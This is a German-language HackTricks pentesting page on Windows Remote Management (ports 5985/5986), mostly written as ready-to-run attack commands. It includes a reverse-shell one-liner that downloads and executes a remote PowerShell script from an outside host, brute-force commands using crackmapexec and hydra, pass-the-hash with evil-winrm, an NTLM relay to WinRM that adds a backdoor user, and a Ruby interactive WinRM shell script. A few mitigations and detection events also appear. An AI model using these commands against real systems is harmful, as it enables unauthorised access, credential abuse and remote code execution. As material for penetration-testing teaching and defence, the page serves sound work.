# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) wird als ein **Protokoll von Microsoft** hervorgehoben, das die **Fernverwaltung von Windows-Systemen** über HTTP(S) ermöglicht und dabei SOAP nutzt. Es wird grundlegend von WMI unterstützt und präsentiert sich als eine HTTP-basierte Schnittstelle für WMI-Operationen.

Das Vorhandensein von WinRM auf einem Rechner ermöglicht eine unkomplizierte Fernadministration über PowerShell, ähnlich wie SSH für andere Betriebssysteme funktioniert. Um festzustellen, ob WinRM aktiv ist, wird empfohlen, das Öffnen bestimmter Ports zu überprüfen:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Ein offener Port aus der obigen Liste zeigt an, dass WinRM eingerichtet wurde, was Versuche zur Initiierung einer Remote-Sitzung erlaubt.

### **Initiierung einer WinRM-Sitzung**

Um PowerShell für WinRM zu konfigurieren, kommt Microsofts `Enable-PSRemoting` Cmdlet zum Einsatz, das den Computer so einrichtet, dass er Remote-PowerShell-Befehle akzeptiert. Mit erhöhtem PowerShell-Zugriff können die folgenden Befehle ausgeführt werden, um diese Funktionalität zu aktivieren und jeden Host als vertrauenswürdig zu kennzeichnen:
```bash
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Dieser Ansatz beinhaltet das Hinzufügen eines Wildcards zur `trustedhosts`-Konfiguration, ein Schritt, der aufgrund seiner Implikationen sorgfältig überlegt werden muss. Es wird auch angemerkt, dass es notwendig sein könnte, den Netzwerktyp von "Öffentlich" auf "Arbeit" auf dem Rechner des Angreifers zu ändern.

Darüber hinaus kann WinRM **ferngesteuert aktiviert** werden, indem der `wmic`-Befehl verwendet wird, wie folgt demonstriert:
```bash
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Diese Methode ermöglicht die Remote-Einrichtung von WinRM und verbessert die Flexibilität bei der Verwaltung von Windows-Maschinen aus der Ferne.

### Testen, ob konfiguriert

Um die Einrichtung Ihrer Angriffsmaschine zu überprüfen, wird der Befehl `Test-WSMan` verwendet, um zu prüfen, ob das Ziel WinRM ordnungsgemäß konfiguriert hat. Durch die Ausführung dieses Befehls sollten Sie Details zur Protokollversion und wsmid erwarten, die auf eine erfolgreiche Konfiguration hinweisen. Nachfolgend sind Beispiele aufgeführt, die die erwartete Ausgabe für ein konfiguriertes Ziel im Vergleich zu einem nicht konfigurierten zeigen:

- Für ein Ziel, das **ordentlich** konfiguriert ist, wird die Ausgabe ähnlich wie folgt aussehen:
```bash
Test-WSMan <target-ip>
```
Die Antwort sollte Informationen über die Protokollversion und wsmid enthalten, die signalisieren, dass WinRM korrekt eingerichtet ist.

![](<../images/image (582).png>)

- Im Gegensatz dazu würde ein Ziel, das **nicht** für WinRM konfiguriert ist, keine solchen detaillierten Informationen liefern, was das Fehlen einer ordnungsgemäßen WinRM-Konfiguration hervorhebt.

![](<../images/image (458).png>)

### Führen Sie einen Befehl aus

Um `ipconfig` remote auf einem Zielrechner auszuführen und die Ausgabe anzuzeigen, tun Sie:
```bash
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Sie können auch **einen Befehl Ihrer aktuellen PS-Konsole über** _**Invoke-Command**_ **ausführen**. Angenommen, Sie haben lokal eine Funktion namens _**enumeration**_ und möchten sie **auf einem Remote-Computer ausführen**, können Sie Folgendes tun:
```bash
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Ein Skript ausführen
```bash
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Reverse-Shell erhalten
```bash
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Erhalte eine PS-Sitzung

Um eine interaktive PowerShell-Shell zu erhalten, verwende `Enter-PSSession`:
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**Die Sitzung wird in einem neuen Prozess (wsmprovhost) innerhalb des "Opfers" ausgeführt**

### **WinRM Öffnen Erzwingen**

Um PS Remoting und WinRM zu verwenden, aber der Computer nicht konfiguriert ist, könnten Sie es mit folgendem aktivieren:
```bash
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Speichern und Wiederherstellen von Sitzungen

Dies **funktioniert nicht**, wenn die **Sprache** auf dem Remote-Computer **eingeschränkt** ist.
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Innerhalb dieser Sitzungen können Sie PS-Skripte mit _Invoke-Command_ laden.
```bash
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Fehler

Wenn Sie den folgenden Fehler finden:

`enter-pssession : Verbindung zum Remote-Server 10.10.10.175 fehlgeschlagen mit der folgenden Fehlermeldung : Der WinRM-Client kann die Anfrage nicht verarbeiten. Wenn das Authentifizierungsschema von Kerberos abweicht oder wenn der Client-Computer nicht zu einer Domäne gehört, muss HTTPS-Transport verwendet werden oder die Zielmaschine muss zur TrustedHosts-Konfiguration hinzugefügt werden. Verwenden Sie winrm.cmd, um TrustedHosts zu konfigurieren. Beachten Sie, dass Computer in der TrustedHosts-Liste möglicherweise nicht authentifiziert sind. Sie können weitere Informationen dazu erhalten, indem Sie den folgenden Befehl ausführen: winrm help config. Weitere Informationen finden Sie im Hilfethema about_Remote_Troubleshooting.`

Der Versuch auf dem Client (Informationen von [hier](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM-Verbindung in Linux

### Brute Force

Seien Sie vorsichtig, das Brute-Forcen von winrm könnte Benutzer blockieren.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Verwendung von evil-winrm
```ruby
gem install evil-winrm
```
Lies die **Dokumentation** auf GitHub: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Um evil-winrm zu verwenden, um sich mit einer **IPv6-Adresse** zu verbinden, erstellen Sie einen Eintrag in _**/etc/hosts**_, der einen **Domainnamen** der IPv6-Adresse zuweist, und verbinden Sie sich mit dieser Domain.

### Pass the hash with evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Verwendung einer PS-Docker-Maschine
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Verwendung eines Ruby-Skripts

**Code hierher extrahiert:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

---

## Aktuelle Schwachstellen & Offensive Techniken (2021-2025)

### NTLM-Relay direkt zu WinRM (WS-MAN)
Seit Impacket 0.11 (Mai 2023) kann `ntlmrelayx.py` erfasste NTLM-Anmeldeinformationen direkt an einen **WS-MAN**/WinRM-Listener weiterleiten. Wenn ein Host weiterhin auf **unencrypted HTTP (5985)** lauscht, kann ein Angreifer *mitm6* (oder *Responder*) kombinieren, um die Authentifizierung zu erzwingen und SYSTEM-Level-Codeausführung zu erlangen:
```bash
sudo ntlmrelayx.py -t wsman://10.0.0.25 --no-smb-server -smb2support \
--command "net user pwned P@ssw0rd! /add"
```
Mitigationen
* Deaktivieren Sie HTTP-Listener – `Set-Item WSMan:\localhost\Service\EnableCompatibilityHttpListener -Value false`
* Erzwingen Sie HTTPS und aktivieren Sie den erweiterten Schutz für die Authentifizierung (EPA) in aktuellen Windows-Versionen.

### OMIGOD – CVE-2021-38647 (Azure OMI)
Azure Linux-Agenten verwenden den **Open Management Infrastructure (OMI)**-Dienst, der die WinRM/WS-MAN-API auf den Ports **5985/5986** bereitstellt. Ein Logikfehler ermöglichte **unauthentifizierte RCE als root**:
```text
curl http://victim:5985/wsman -H 'Content-Type:text/xml' -d '<xml …/>'
```
Patch oder entfernen Sie OMI (Version ≥ 1.6.8-1) und blockieren Sie diese Ports aus dem Internet.

### Missbrauch von WSMan.Automation COM für laterale Bewegung
WinRM kann ohne PowerShell über das `WSMan.Automation` COM-Objekt gesteuert werden – nützlich auf Systemen im Constrained-Language-Modus. Tools wie *SharpWSManWinRM* umhüllen diese Technik:
```powershell
$ws = New-Object -ComObject 'WSMan.Automation'
$session = $ws.CreateSession('http://srv01:5985/wsman',0,$null)
$cmdId   = $session.Command('cmd.exe',@('/c','whoami'))
$session.Signal($cmdId,0)
```
Die Ausführungskette (`svchost → wmiprvse → cmd.exe`) ist identisch mit klassischem PS-Remoting.

---

## Tool-Updates

* **Evil-WinRM v3.x (2024)** – unterstützt jetzt **Kerberos** (`-k` / `--spn`) und **zertifikatbasierte** Authentifizierung (`--cert-pem`/`--key-pem`), Sitzungsprotokollierung (`-L`) und die Möglichkeit, die Remote-Pfadvervollständigung zu deaktivieren (`-N`).

```bash
RHOST=10.0.0.25 evil-winrm -i $RHOST -u j.doe -k --spn HTTP/$RHOST
```

* **Python – `pypsrp` 0.9 (2024)** bietet WinRM & PS-Remoting von Linux aus, einschließlich CredSSP und Kerberos:

```python
from psrp.client import Client
c = Client('srv01', username='ACME\\j.doe', ssl=True)
print(c.execute_cmd('ipconfig /all').std_out.decode())
```

* **Erkennung** – überwachen Sie das **Microsoft-Windows-WinRM/Operational** Protokoll:
* Ereignis 91 / 163 – Shell erstellt
* Ereignis 182 – Authentifizierungsfehler
* Im Sicherheitsprotokoll zeichnet Ereignis 4262 die Quell-IP auf (hinzugefügt Juli 2022 CUs).
Sammeln Sie diese zentral und alarmieren Sie bei anonymen oder externen IPs.

---

## Shodan

- `port:5985 Microsoft-HTTPAPI`

## Referenzen

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/](https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/)
- [https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure](https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure)

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatische Befehle
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
